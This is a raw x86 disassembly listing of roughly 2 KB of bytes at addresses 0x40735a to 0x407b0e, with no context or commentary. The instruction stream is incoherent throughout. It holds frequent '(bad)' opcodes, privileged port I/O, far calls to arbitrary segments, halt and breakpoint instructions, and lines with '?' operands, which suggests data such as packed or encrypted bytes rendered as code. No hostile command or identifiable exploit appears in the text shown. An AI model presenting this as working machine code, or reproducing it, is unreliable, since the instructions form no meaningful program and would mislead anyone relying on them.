  40735a:	nop
  40735b:	loope  0x407343
  40735d:	jnp    0x4072f7
  40735f:	(bad)  
  407360:	test   al,0xb5
  407362:	sbb    dl,BYTE PTR [eax+0x74]
  407365:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  407367:	pop    esp
  407368:	or     al,0x2d
  40736a:	mov    BYTE PTR [eax],dl
  40736c:	and    DWORD PTR [ecx],esi
  40736e:	(bad)  
  40736f:	sahf   
  407370:	xor    DWORD PTR [esi],ecx
  407372:	mov    al,ds:0xf49daa53
  407377:	int    0xed
  407379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40737a:	ja     0x4073d7
  40737c:	adc    DWORD PTR [esi-0x71455132],eax
  407382:	loopne 0x407320
  407384:	inc    ecx
  407385:	push   es
  407386:	pop    es
  407387:	and    DWORD PTR [esp+edi*8+0x385d5202],edx
  40738e:	mov    ecx,0x465dd3d4
  407393:	out    0x18,al
  407395:	imul   edx,ecx,0x6abc6efa
  40739b:	xchg   edi,eax
  40739c:	add    DWORD PTR [edx+0x6260e815],0x44
  4073a3:	cmc    
  4073a4:	call   0x225:0xf997796c
  4073ab:	inc    eax
  4073ac:	ret    0x5aad
  4073af:	mov    edx,0x54e0fcf0
  4073b4:	paddq  mm0,QWORD PTR [esi]
  4073b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073b8:	inc    eax
  4073b9:	retf   0x383e
  4073bc:	pop    ds
  4073bd:	xor    BYTE PTR [ecx-0x26cda56c],ah
  4073c3:	in     eax,dx
  4073c4:	cmc    
  4073c5:	pop    es
  4073c6:	call   0xabee8545
  4073cb:	mov    ds:0xeadf0c12,eax
  4073d0:	mov    al,ds:0x997d82f8
  4073d5:	out    0x33,al
  4073d7:	mov    edi,0xf4178cde
  4073dc:	sub    ch,bl
  4073de:	xor    BYTE PTR [edx-0x316f03a0],ah
  4073e4:	(bad)  
  4073e5:	fimul  DWORD PTR [edx-0xd858089]
  4073eb:	dec    ebp
  4073ec:	or     eax,0x84fac96e
  4073f1:	jne    0x407470
  4073f3:	pop    ebp
  4073f4:	push   ecx
  4073f5:	sar    DWORD PTR [ebx],0xff
  4073f8:	mov    edi,0xa4de198d
  4073fd:	pop    ss
  4073fe:	push   esi
  4073ff:	xchg   BYTE PTR [eax],ah
  407401:	test   DWORD PTR [edi],edx
  407403:	dec    ebx
  407404:	lea    edi,[ebx-0x5d]
  407407:	stos   DWORD PTR es:[edi],eax
  407408:	iret   
  407409:	inc    BYTE PTR [edi-0x18]
  40740c:	int3   
  40740d:	inc    eax
  40740e:	clc    
  40740f:	cmp    ch,BYTE PTR [ebx-0x45]
  407412:	das    
  407413:	or     cl,cl
  407415:	(bad)  
  407416:	mov    ch,0xfb
  407418:	test   eax,0xf3cf12cb
  40741d:	jle    0x407429
  40741f:	repz mov ebp,0xf113fa3d
  407425:	pusha  
  407426:	xor    BYTE PTR [esi+0x69],bh
  407429:	sub    BYTE PTR [ebp-0x32],dh
  40742c:	add    bh,al
  40742e:	cmc    
  40742f:	int3   
  407430:	loope  0x4073f0
  407432:	jl     0x407454
  407434:	mov    eax,0x530b7a49
  407439:	mov    edi,0xa6988be4
  40743e:	arpl   WORD PTR ds:0xc468761e,sp
  407444:	hlt    
  407445:	lods   eax,DWORD PTR ds:[esi]
  407446:	loopne 0x407478
  407448:	sbb    esp,edx
  40744a:	sbb    al,BYTE PTR [edx]
  40744c:	aaa    
  40744d:	dec    ebx
  40744e:	rcr    esi,cl
  407450:	es mov ebx,0x58fdd6d3
  407456:	pop    eax
  407457:	cmp    bl,BYTE PTR [edx+0x331dcd28]
  40745d:	loopne 0x407402
  40745f:	imul   edx,esp,0x5
  407462:	pop    ebx
  407463:	je     0x407448
  407465:	cmp    bh,dl
  407467:	mov    eax,ds:0xca8a65dc
  40746c:	pop    edi
  40746d:	sub    BYTE PTR [ebx+esi*8+0x6f08c6ab],dl
  407474:	cmp    esp,0xffffffb8
  407477:	leave  
  407478:	dec    esi
  407479:	or     ebp,DWORD PTR [edi+0x75]
  40747c:	call   0xd410:0xaa131547
  407483:	jne    0x40744a
  407485:	es xchg edi,eax
  407487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407488:	or     BYTE PTR [eax+0x64],bh
  40748b:	sub    ah,al
  40748d:	leave  
  40748e:	mov    cl,0xb2
  407490:	jbe    0x40749c
  407492:	xor    DWORD PTR [ecx],0x9156a0a5
  407498:	mov    al,ds:0x28e1a36
  40749d:	sar    DWORD PTR [ecx-0x1f],cl
  4074a0:	aam    0xee
  4074a2:	outs   dx,DWORD PTR ds:[esi]
  4074a3:	pushf  
  4074a4:	push   es
  4074a5:	nop
  4074a6:	enter  0x64e0,0x6b
  4074aa:	add    eax,0xc1e6fc2
  4074af:	retf   0x5b51
  4074b2:	cmp    esi,eax
  4074b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074b5:	mov    al,al
  4074b7:	nop
  4074b8:	xchg   esi,eax
  4074b9:	retf   
  4074ba:	xor    al,0x25
  4074bc:	outs   dx,BYTE PTR ds:[esi]
  4074bd:	adc    eax,0xe72f3f04
  4074c2:	add    DWORD PTR [ebp+0x6d38e957],edi
  4074c8:	cmp    edx,ebp
  4074ca:	mov    esp,0xb894eea2
  4074cf:	adc    DWORD PTR ds:0x9123453d,edx
  4074d5:	push   ecx
  4074d6:	sbb    al,0x36
  4074d8:	inc    ebx
  4074d9:	jl     0x4074a7
  4074db:	jmp    0xf34a:0x8f6ddf97
  4074e2:	jae    0x407490
  4074e4:	inc    ebp
  4074e5:	mov    cl,0x34
  4074e7:	adc    ecx,DWORD PTR [ecx+edi*4+0x38]
  4074eb:	mov    eax,ds:0xcfaae082
  4074f0:	cmp    ebp,DWORD PTR [ecx+eax*8+0x593f7216]
  4074f7:	sbb    ah,dl
  4074f9:	mov    bl,0x1e
  4074fb:	inc    ebp
  4074fc:	xchg   esp,eax
  4074fd:	retf   0xcc3b
  407500:	div    ecx
  407502:	pop    esi
  407503:	push   cs
  407504:	mov    cl,0x85
  407506:	dec    esi
  407507:	jp     0x407580
  407509:	les    eax,FWORD PTR [esi+eiz*1]
  40750c:	data16 or al,0x2a
  40750f:	or     eax,0x375f7cbb
  407514:	push   eax
  407515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407516:	mov    dl,0xe3
  407518:	mov    esi,0xdaac181e
  40751d:	jo     0x407550
  40751f:	jnp    0x407503
  407521:	idiv   BYTE PTR [ebx-0x5f014c9d]
  407527:	rcr    DWORD PTR ds:0x9f236726,0xeb
  40752e:	add    ebp,DWORD PTR [ebp-0x3f]
  407531:	rcl    DWORD PTR [ecx+0x699f4a66],0x21
  407538:	lea    eax,[eax+esi*8]
  40753b:	leave  
  40753c:	mov    ch,0xee
  40753e:	data16 mov bl,0xf0
  407541:	pop    eax
  407542:	adc    esi,DWORD PTR [edi+0x66321d53]
  407548:	ret    0xba61
  40754b:	sti    
  40754c:	ds retf 
  40754e:	adc    ecx,DWORD PTR [ecx-0x34]
  407551:	fcomp  QWORD PTR [ebx]
  407553:	inc    ebx
  407554:	sbb    ebp,DWORD PTR [esi+eax*2]
  407557:	fstp   DWORD PTR [esi+0x49770475]
  40755d:	xor    al,BYTE PTR [eax-0x55157883]
  407563:	pop    esi
  407564:	call   0x6939bf50
  407569:	jae    0x4075cc
  40756b:	outs   dx,DWORD PTR ds:[esi]
  40756c:	jle    0x40754d
  40756e:	pop    esp
  40756f:	shl    DWORD PTR [edi],cl
  407571:	ret    
  407572:	jle    0x4075b3
  407574:	xor    eax,0xc112d34b
  407579:	dec    ebp
  40757a:	bound  ecx,QWORD PTR [edi-0x17]
  40757d:	xor    cl,al
  40757f:	fs enter 0xa2b,0x20
  407584:	inc    eax
  407585:	pusha  
  407586:	inc    edi
  407587:	dec    BYTE PTR [edi+eiz*1+0x7e]
  40758b:	push   ds
  40758c:	stos   DWORD PTR es:[edi],eax
  40758d:	test   WORD PTR [ebx+ecx*4+0x54144788],0x5822
  407597:	sub    ebp,eax
  407599:	sub    ebx,DWORD PTR [ecx+eiz*4]
  40759c:	es jbe 0x40753b
  40759f:	lods   al,BYTE PTR ds:[esi]
  4075a0:	cdq    
  4075a1:	dec    edi
  4075a2:	inc    eax
  4075a3:	push   ds
  4075a4:	pushf  
  4075a5:	push   edx
  4075a6:	push   cs
  4075a7:	sbb    al,0xfb
  4075a9:	aas    
  4075aa:	add    ch,dl
  4075ac:	loop   0x4075e1
  4075ae:	xchg   edx,eax
  4075af:	pop    ebp
  4075b0:	dec    eax
  4075b1:	cmp    eax,esi
  4075b3:	xchg   ebx,eax
  4075b4:	clc    
  4075b5:	push   esp
  4075b6:	pop    edi
  4075b7:	bound  esi,QWORD PTR [esi+0x1918dda4]
  4075bd:	in     al,dx
  4075be:	push   ss
  4075bf:	dec    edx
  4075c0:	fdiv   QWORD PTR [ebp-0x102c4c34]
  4075c6:	bswap  esp
  4075c8:	out    0x9f,al
  4075ca:	call   0x8d76979b
  4075cf:	lock pop ebp
  4075d1:	(bad)  
  4075d2:	jno    0x40760e
  4075d4:	cld    
  4075d5:	push   ebx
  4075d6:	cmp    ch,BYTE PTR [edi+0x76]
  4075d9:	in     al,dx
  4075da:	push   ds
  4075db:	or     al,0x70
  4075dd:	mov    dh,0x68
  4075df:	mov    ch,0x46
  4075e1:	inc    eax
  4075e2:	sub    DWORD PTR [edx+0x45cd7ca1],0x4571bd8c
  4075ec:	dec    ebp
  4075ed:	fild   WORD PTR [ebp-0x4c305730]
  4075f3:	inc    ebp
  4075f4:	pusha  
  4075f5:	mov    al,0xd3
  4075f7:	inc    edx
  4075f8:	test   DWORD PTR [eax-0x10],0x5aff1027
  4075ff:	ret    
  407600:	lods   al,BYTE PTR ds:[esi]
  407601:	mov    ds:0x28d849a3,al
  407606:	or     DWORD PTR [eax+0x32],ebp
  407609:	lods   eax,DWORD PTR ds:[esi]
  40760a:	cld    
  40760b:	mov    dh,0x34
  40760d:	sub    ch,BYTE PTR [edx]
  40760f:	sbb    eax,0x9ef73761
  407614:	push   ebx
  407615:	xchg   ebp,eax
  407616:	sbb    bh,BYTE PTR [edi]
  407618:	mov    ds:0x6d8e7cbf,eax
  40761d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40761e:	pop    ss
  40761f:	out    dx,al
  407620:	pop    ecx
  407621:	repnz mov cl,0xc2
  407624:	fnstcw WORD PTR ss:[edx]
  407627:	inc    eax
  407628:	add    esi,ebp
  40762a:	or     al,0x78
  40762c:	lods   al,BYTE PTR ds:[esi]
  40762d:	dec    ecx
  40762e:	sub    cl,BYTE PTR [ebp-0x33]
  407631:	mov    ds:0xefd1f979,al
  407636:	mov    bh,0x67
  407638:	mov    esi,DWORD PTR [ecx]
  40763a:	jle    0x407618
  40763c:	in     eax,0xa0
  40763e:	inc    ecx
  40763f:	push   ebp
  407640:	and    al,0x84
  407642:	and    eax,0x141373ef
  407647:	and    DWORD PTR [ebp-0x7a],ecx
  40764a:	inc    ebp
  40764b:	cwde   
  40764c:	nop
  40764d:	fxtract 
  40764f:	adc    al,0x4d
  407651:	push   0x3
  407653:	(bad)  
  407655:	cwde   
  407656:	add    DWORD PTR [ecx-0x1d],esi
  407659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40765a:	and    ebx,DWORD PTR ds:0x17d78cad
  407660:	push   eax
  407661:	xchg   edx,eax
  407662:	pop    esp
  407663:	pop    eax
  407664:	or     al,0x17
  407666:	repnz and edi,esp
  407669:	mov    ds:0xd5651f94,eax
  40766e:	sub    DWORD PTR [esi+0x65],ebp
  407671:	arpl   WORD PTR [ebx],bp
  407673:	mov    eax,0x8ed6536b
  407678:	jns    0x4076c8
  40767a:	push   edx
  40767b:	push   ebp
  40767c:	cmc    
  40767d:	jae    0x407620
  40767f:	cmp    DWORD PTR [ebp-0x13],ecx
  407682:	fild   DWORD PTR [edx]
  407684:	ffree  st(1)
  407686:	in     al,0xc9
  407688:	or     eax,0x4893e329
  40768d:	(bad)  
  40768e:	jg     0x40765f
  407690:	lahf   
  407691:	sbb    ebp,ebp
  407693:	sti    
  407694:	and    cl,BYTE PTR [edx]
  407696:	lds    esi,FWORD PTR [ecx+0x56]
  407699:	fdiv   QWORD PTR [eiz*4+0x6d0283ae]
  4076a0:	dec    edi
  4076a1:	inc    edx
  4076a2:	dec    eax
  4076a3:	jbe    0x407692
  4076a5:	cmp    ah,BYTE PTR [ebp+esi*8+0x61]
  4076a9:	rcr    BYTE PTR ds:0x6c621fb4,0x3e
  4076b0:	xor    al,0x4f
  4076b2:	inc    edi
  4076b3:	or     ah,BYTE PTR [esi]
  4076b5:	mov    edi,0xd308dbe8
  4076ba:	shl    BYTE PTR [edx],0x12
  4076bd:	ins    DWORD PTR es:[edi],dx
  4076be:	popf   
  4076bf:	push   ebp
  4076c0:	xor    eax,0xe04fae81
  4076c5:	pop    ds
  4076c6:	inc    ebp
  4076c7:	sub    BYTE PTR [edx],ch
  4076c9:	daa    
  4076ca:	test   al,0x4b
  4076cc:	mov    cl,0x29
  4076ce:	cmp    edx,edi
  4076d0:	mov    esp,0xaaaa65fe
  4076d5:	ror    BYTE PTR [ebp+0x5a],cl
  4076d8:	jnp    0x40766a
  4076da:	jnp    0x4076a5
  4076dc:	out    dx,eax
  4076dd:	xchg   esi,eax
  4076de:	pop    ebp
  4076df:	pusha  
  4076e0:	test   al,0xa8
  4076e2:	mov    edi,esi
  4076e4:	cmp    BYTE PTR [eax+0x6c],dl
  4076e7:	ins    BYTE PTR es:[edi],dx
  4076e8:	dec    esp
  4076e9:	mov    edx,DWORD PTR [esi]
  4076eb:	add    ah,BYTE PTR [eax-0x65]
  4076ee:	icebp  
  4076ef:	push   0xffffffbf
  4076f1:	or     eax,0x961b5233
  4076f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f7:	mov    ds:0xe97363f9,al
  4076fc:	or     DWORD PTR [edx+0x408c5539],ebp
  407702:	outs   dx,DWORD PTR ds:[esi]
  407703:	push   cs
  407704:	sahf   
  407705:	aam    0x45
  407707:	psubsb mm0,QWORD PTR [ecx+0x3d]
  40770b:	push   0x38
  40770d:	aad    0xc6
  40770f:	sbb    DWORD PTR [ecx-0x4c],edi
  407712:	sti    
  407713:	xor    eax,0x8a87330a
  407718:	add    BYTE PTR [edi+0x13ecbab9],bh
  40771e:	push   eax
  40771f:	(bad)  
  407721:	das    
  407722:	in     al,0x9
  407724:	add    al,0xc
  407726:	stos   BYTE PTR es:[edi],al
  407727:	jne    0x40775e
  407729:	loope  0x4076dc
  40772b:	add    eax,0xdccebe4e
  407730:	sbb    BYTE PTR [ecx+edi*4+0x32af1705],0xe0
  407738:	outs   dx,DWORD PTR ds:[esi]
  407739:	shr    BYTE PTR [esi],cl
  40773b:	int3   
  40773c:	jg     0x407703
  40773e:	div    DWORD PTR [ebx+esi*4+0x4c]
  407742:	inc    esp
  407743:	dec    ebp
  407744:	jno    0x4077b4
  407746:	sub    ebx,DWORD PTR [ebp+0x29]
  407749:	sti    
  40774a:	icebp  
  40774b:	mov    esi,0x11506214
  407750:	adc    al,0x5f
  407752:	pop    esi
  407753:	dec    ebx
  407754:	mov    al,ds:0xd164d92c
  407759:	dec    ebx
  40775a:	scas   eax,DWORD PTR es:[edi]
  40775b:	(bad)  
  40775c:	clc    
  40775d:	and    al,0x46
  40775f:	jp     0x4077ab
  407761:	mov    bl,0xef
  407763:	data16 loop 0x4077d7
  407766:	pop    ds
  407767:	in     eax,0x75
  407769:	test   al,0x8a
  40776b:	icebp  
  40776c:	repnz mov eax,0xeeef21f5
  407772:	dec    ebp
  407773:	stos   BYTE PTR es:[edi],al
  407774:	push   ecx
  407775:	jp     0x407787
  407777:	and    dl,BYTE PTR gs:[ecx+0x3a2fc95e]
  40777e:	fisubr DWORD PTR [ecx+ecx*2]
  407781:	xchg   ebx,eax
  407782:	push   ss
  407783:	jmp    0xfb6:0xa8ac3166
  40778a:	popa   
  40778b:	shr    BYTE PTR [eax],cl
  40778d:	fwait
  40778e:	shl    BYTE PTR [ecx],cl
  407790:	(bad)  
  407791:	jno    0x407766
  407793:	leave  
  407794:	dec    ebp
  407795:	(bad)  
  407796:	jb     0x4077e5
  407798:	inc    eax
  407799:	push   eax
  40779a:	cmp    al,0xb3
  40779c:	dec    esi
  40779d:	mov    esp,0xc290a8b7
  4077a2:	test   eax,0x4c27ff72
  4077a7:	jnp    0x4077dd
  4077a9:	cs cld 
  4077ab:	lahf   
  4077ac:	and    edi,DWORD PTR [edi-0x3b]
  4077af:	dec    esi
  4077b0:	xor    al,0x24
  4077b2:	xchg   ebp,eax
  4077b3:	jp     0x407751
  4077b5:	fnsave [eax+0x6a92a351]
  4077bb:	mov    WORD PTR [esi+0x33],ss
  4077be:	adc    DWORD PTR [ebx],esp
  4077c0:	or     ecx,edi
  4077c2:	(bad)  
  4077c4:	or     BYTE PTR [edi+0x402dbc3],bl
  4077ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077cb:	and    al,0xfa
  4077cd:	cmp    DWORD PTR [esi-0x4a],ebx
  4077d0:	dec    ecx
  4077d1:	nop
  4077d2:	sti    
  4077d3:	jecxz  0x4077c4
  4077d5:	leave  
  4077d6:	test   ecx,0x73f562ab
  4077dc:	js     0x407773
  4077de:	mov    eax,ds:0xbac5d326
  4077e3:	xor    ah,dh
  4077e5:	out    0x8a,al
  4077e7:	jmp    0x9706bb85
  4077ec:	mov    bl,0x84
  4077ee:	pop    ss
  4077ef:	jbe    0x4077d1
  4077f1:	add    BYTE PTR [edx-0x291e0e36],bl
  4077f7:	add    DWORD PTR [edx-0x57],ebx
  4077fa:	shl    BYTE PTR [ebp+0x66],cl
  4077fd:	add    bl,ch
  4077ff:	or     esp,DWORD PTR [edx]
  407801:	aad    0xa
  407803:	and    ebx,ebp
  407805:	int    0x65
  407807:	test   eax,0x39a6184d
  40780c:	cmp    BYTE PTR [edx-0x39b23105],dl
  407812:	repz jmp 0xb9e3:0x1b5278a4
  40781a:	mov    ds:0x8b9fd8a2,al
  40781f:	dec    ecx
  407820:	sub    DWORD PTR [eax+0x23],0x84b98bce
  407827:	jbe    0x40787d
  407829:	pop    ecx
  40782a:	pop    eax
  40782b:	hlt    
  40782c:	cli    
  40782d:	arpl   WORD PTR [ebx+ebp*1-0x46],si
  407831:	sti    
  407832:	adc    DWORD PTR [ebp+0x5d0c0051],edx
  407838:	pop    eax
  407839:	daa    
  40783a:	aam    0xa2
  40783c:	pop    ebp
  40783d:	ss xchg ebx,eax
  40783f:	jge    0x407832
  407841:	test   BYTE PTR [edi-0x22500886],dh
  407847:	xchg   esi,eax
  407848:	add    esi,ecx
  40784a:	ins    BYTE PTR es:[edi],dx
  40784b:	mov    gs,eax
  40784d:	sub    al,0x84
  40784f:	push   esi
  407850:	xor    ah,al
  407852:	xlat   BYTE PTR ds:[ebx]
  407853:	xchg   edx,eax
  407854:	cmp    cl,dl
  407856:	xor    BYTE PTR ds:0x55795815,al
  40785c:	sbb    DWORD PTR [edx+0x26a83963],edx
  407862:	fwait
  407863:	bound  edi,QWORD PTR [edx-0x1fc95ed9]
  407869:	sti    
  40786a:	inc    edi
  40786b:	imul   esp,DWORD PTR [edx],0x1318add7
  407871:	xchg   dl,dl
  407873:	dec    edi
  407874:	in     al,dx
  407875:	loope  0x407894
  407877:	test   BYTE PTR [edx],al
  407879:	push   ebp
  40787a:	loopne 0x407883
  40787c:	mov    eax,0x5d447127
  407881:	pop    ecx
  407882:	jnp    0x40789c
  407884:	repz jl 0x407855
  407887:	or     al,0x4f
  407889:	pop    ss
  40788a:	mov    edi,ss
  40788c:	jo     0x407841
  40788e:	shl    DWORD PTR [ebp+0x39c98f7f],1
  407894:	ret    0xb0f9
  407897:	sub    ah,BYTE PTR [eax+0x53]
  40789a:	(bad)  
  40789b:	mov    ds:0xc1caf63a,al
  4078a0:	or     ecx,eax
  4078a2:	jmp    0x40786e
  4078a4:	ret    
  4078a5:	stos   DWORD PTR es:[edi],eax
  4078a6:	cmp    eax,0xa2664f93
  4078ab:	fs mov fs,ebp
  4078ae:	imul   ebx,ecx,0xc97d344c
  4078b4:	jae    0x40789d
  4078b6:	push   ds
  4078b7:	push   ss
  4078b8:	add    BYTE PTR ss:0x6acd3b51,al
  4078bf:	sbb    BYTE PTR [edi+0x45],dl
  4078c2:	jle    0x4078f9
  4078c4:	inc    eax
  4078c5:	fisttp DWORD PTR gs:[esi+0x16d24002]
  4078cc:	push   cs
  4078cd:	dec    ebp
  4078ce:	dec    edx
  4078cf:	fcomp  DWORD PTR [eax+ebx*4-0x249e03b6]
  4078d6:	addr16 jo 0x4078a4
  4078d9:	or     ecx,edx
  4078db:	loopne 0x4078a4
  4078dd:	dec    ecx
  4078de:	cmp    bl,bh
  4078e0:	in     al,0xfa
  4078e2:	sbb    al,0x9e
  4078e4:	cli    
  4078e5:	sub    bl,BYTE PTR [ecx]
  4078e7:	sahf   
  4078e8:	mov    ah,0x89
  4078ea:	outs   dx,DWORD PTR ds:[esi]
  4078eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078ec:	int    0xf9
  4078ee:	shr    edi,cl
  4078f0:	out    dx,al
  4078f1:	sbb    al,0x80
  4078f3:	or     DWORD PTR [eax-0xa],ebx
  4078f6:	sbb    dl,BYTE PTR [eax-0x31]
  4078f9:	stos   DWORD PTR es:[edi],eax
  4078fa:	sub    eax,0xde497f24
  4078ff:	xor    DWORD PTR [ecx-0x72],edi
  407902:	jno    0x4078c6
  407904:	add    ah,0x29
  407907:	call   0xacd5:0x50ed20e7
  40790e:	es stos DWORD PTR es:[edi],eax
  407910:	fidivr DWORD PTR [edx]
  407912:	mov    ss,WORD PTR [ecx-0x5f]
  407915:	mov    bh,0xb0
  407917:	ss push edi
  407919:	inc    esp
  40791a:	mov    ebx,?
  40791c:	mov    ch,ah
  40791e:	cli    
  40791f:	sar    BYTE PTR [eax],cl
  407921:	arpl   WORD PTR [ecx-0x5e],ax
  407924:	or     al,0xf8
  407926:	mov    ds:0xc7b0f2a6,al
  40792b:	into   
  40792c:	in     al,0xc0
  40792e:	or     BYTE PTR [ebx-0x69ef35a7],dl
  407934:	cmc    
  407935:	dec    di
  407937:	iret   
  407938:	(bad)  
  407939:	dec    edi
  40793a:	dec    edx
  40793b:	pop    esi
  40793c:	neg    DWORD PTR [ebx-0x15]
  40793f:	cmc    
  407940:	mov    eax,0xc494f745
  407945:	dec    esp
  407946:	fistp  DWORD PTR [ebx]
  407948:	jb     0x4078e4
  40794a:	dec    edx
  40794b:	aaa    
  40794c:	fisttp QWORD PTR [esi-0x1c6a6d4d]
  407952:	ins    DWORD PTR es:[edi],dx
  407953:	aam    0x3d
  407955:	jmp    0x4078e2
  407957:	daa    
  407958:	xlat   BYTE PTR ds:[ebx]
  407959:	fs push edx
  40795b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40795c:	jne    0x407937
  40795e:	mov    bl,BYTE PTR [ebx+0x38d1f9ad]
  407964:	fs jmp 0xefebc03e
  40796a:	sbb    BYTE PTR [ebx-0x57],ch
  40796d:	iret   
  40796e:	(bad)  
  407970:	sub    ch,BYTE PTR [edi]
  407972:	sub    al,0xa4
  407974:	push   0x4afcdac6
  407979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40797a:	or     ch,dl
  40797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40797d:	mov    dh,BYTE PTR [esi-0x3b]
  407980:	push   cs
  407981:	or     BYTE PTR [ebx],ch
  407983:	cmp    al,cl
  407985:	xor    BYTE PTR [ebx+0x46],al
  407988:	adc    eax,0x3809d92e
  40798d:	mov    dh,0xc3
  40798f:	mov    dh,0x84
  407991:	jae    0x407a01
  407993:	ds xor al,0xbf
  407996:	out    0x2a,eax
  407998:	or     BYTE PTR [edi+edx*8],0x81
  40799c:	jno    0x40795a
  40799e:	and    ch,ch
  4079a0:	div    edi
  4079a2:	jle    0x407973
  4079a4:	jnp    0x40796e
  4079a6:	lock jmp 0x40795d
  4079a9:	leave  
  4079aa:	scas   eax,DWORD PTR es:[edi]
  4079ab:	pushf  
  4079ac:	mov    ds:0x5a5fd427,al
  4079b1:	xchg   DWORD PTR ds:0x9c48e893,edx
  4079b7:	in     eax,0xe3
  4079b9:	cmp    BYTE PTR [eax],al
  4079bb:	sub    eax,0x29672db0
  4079c0:	es or  ah,cl
  4079c3:	mov    ch,0x8a
  4079c5:	aaa    
  4079c6:	pop    es
  4079c7:	adc    edx,DWORD PTR [edx+0x17]
  4079ca:	fstp   DWORD PTR [ebx]
  4079cc:	mov    cl,0x1
  4079ce:	xor    al,0xf7
  4079d0:	sub    eax,0x50d1033a
  4079d5:	add    eax,0x92f68663
  4079da:	icebp  
  4079db:	cdq    
  4079dc:	push   edi
  4079dd:	mov    cl,0x9d
  4079df:	or     al,0x6b
  4079e1:	mov    ?,edi
  4079e3:	and    ebx,0x2108376
  4079e9:	mov    ah,0x3a
  4079eb:	mov    esi,0x63c5fa06
  4079f0:	or     al,ah
  4079f2:	xchg   esp,eax
  4079f3:	lahf   
  4079f4:	bound  ecx,QWORD PTR [eax+0x2c48c2fd]
  4079fa:	push   esi
  4079fb:	call   0x1c256244
  407a00:	xchg   DWORD PTR [edx-0x70],ecx
  407a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a04:	fs jae 0x407a80
  407a07:	jns    0x4079d3
  407a09:	push   ebp
  407a0a:	inc    edx
  407a0b:	xchg   DWORD PTR [edx-0x1704366d],esp
  407a11:	xor    al,0xed
  407a13:	cld    
  407a14:	repz push edi
  407a16:	ds push edx
  407a18:	and    DWORD PTR [esi],0xddfe9c3f
  407a1e:	pop    ebp
  407a1f:	xchg   edx,eax
  407a20:	fld    QWORD PTR [ebp-0x1516006b]
  407a26:	inc    ecx
  407a27:	and    eax,0xcb81c035
  407a2c:	xor    DWORD PTR [edi],eax
  407a2e:	pop    ecx
  407a2f:	jge    0x4079db
  407a31:	adc    DWORD PTR [esi-0x66],0xcbcf3818
  407a38:	fdivr  DWORD PTR [ebx+0x24]
  407a3b:	mov    ecx,DWORD PTR [edi]
  407a3d:	push   eax
  407a3e:	das    
  407a3f:	outs   dx,DWORD PTR ds:[esi]
  407a40:	jb     0x407ab9
  407a42:	ss ror esp,1
  407a45:	in     eax,0x36
  407a47:	outs   dx,BYTE PTR ds:[esi]
  407a48:	loopne 0x407a79
  407a4a:	mov    ecx,0xc339c85f
  407a4f:	cdq    
  407a50:	push   es
  407a51:	cld    
  407a52:	cmp    al,0x20
  407a54:	xchg   ebx,eax
  407a55:	lock out 0x8f,eax
  407a58:	push   edi
  407a59:	mov    ebp,0x628edb73
  407a5e:	fsub   DWORD PTR [edi+esi*2-0x310d52d8]
  407a65:	test   al,0xdc
  407a67:	(bad)  
  407a68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a69:	ins    BYTE PTR es:[edi],dx
  407a6a:	sbb    al,0x15
  407a6c:	add    ebx,DWORD PTR [eax]
  407a6e:	sub    dh,al
  407a70:	fst    QWORD PTR [ebx]
  407a72:	repnz out 0xf,al
  407a75:	mov    cl,0x97
  407a77:	sub    bh,BYTE PTR [edi-0x359d8b29]
  407a7d:	push   es
  407a7e:	cdq    
  407a7f:	aas    
  407a80:	outs   dx,DWORD PTR ds:[esi]
  407a81:	cdq    
  407a82:	loop   0x407a5b
  407a84:	out    0xd7,eax
  407a86:	ja     0x407a67
  407a88:	pop    es
  407a89:	test   al,0x9e
  407a8b:	dec    eax
  407a8c:	xlat   BYTE PTR ds:[ebx]
  407a8d:	mov    esp,0x5eb9d00e
  407a92:	add    al,0x71
  407a94:	mov    bl,0xf
  407a96:	xchg   BYTE PTR [eax],cl
  407a98:	fdiv   QWORD PTR [ecx-0x6a5ef7ea]
  407a9e:	addps  xmm4,XMMWORD PTR [ebp+0xb1ff4e1]
  407aa5:	fiadd  DWORD PTR [esi-0x60]
  407aa8:	test   eax,0x15a4899b
  407aad:	aaa    
  407aae:	push   eax
  407aaf:	xor    eax,0xed88b528
  407ab4:	cli    
  407ab5:	cmp    al,ah
  407ab7:	xchg   esi,eax
  407ab8:	sbb    al,0x2f
  407aba:	mov    al,ds:0x3265dbb4
  407abf:	jp     0x407b09
  407ac1:	cld    
  407ac2:	cmc    
  407ac3:	inc    esp
  407ac4:	mov    eax,0x80b414d3
  407ac9:	rcr    DWORD PTR [edi],0x62
  407acc:	xchg   ebp,eax
  407acd:	mov    edx,0xe2f78110
  407ad2:	inc    DWORD PTR [ecx+0x39]
  407ad5:	in     eax,0x3e
  407ad7:	xchg   edx,eax
  407ad8:	mov    ecx,?
  407ada:	sbb    esp,DWORD PTR [esp+edx*2-0x1e]
  407ade:	mov    esi,0xb5f77ffd
  407ae3:	dec    ebx
  407ae4:	in     eax,dx
  407ae5:	sahf   
  407ae6:	push   ds
  407ae7:	(bad)  
  407ae9:	xchg   ebx,eax
  407aea:	jbe    0x407a7e
  407aec:	aad    0xe2
  407aee:	jne    0x407b5b
  407af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407af1:	sub    al,0xfb
  407af3:	out    0x29,al
  407af5:	dec    ecx
  407af6:	hlt    
  407af7:	cli    
  407af8:	mov    eax,ds:0x5670749f
  407afd:	aas    
  407afe:	lods   al,BYTE PTR ds:[esi]
  407aff:	mov    al,0xd5
  407b01:	nop
  407b02:	jno    0x407b76
  407b04:	sub    eax,0xed49cc20
  407b09:	(bad)  [esi]
  407b0b:	jbe    0x407ac3
  407b0d:	dec    ebp
  407b0e:	jecxz  0x407b4b
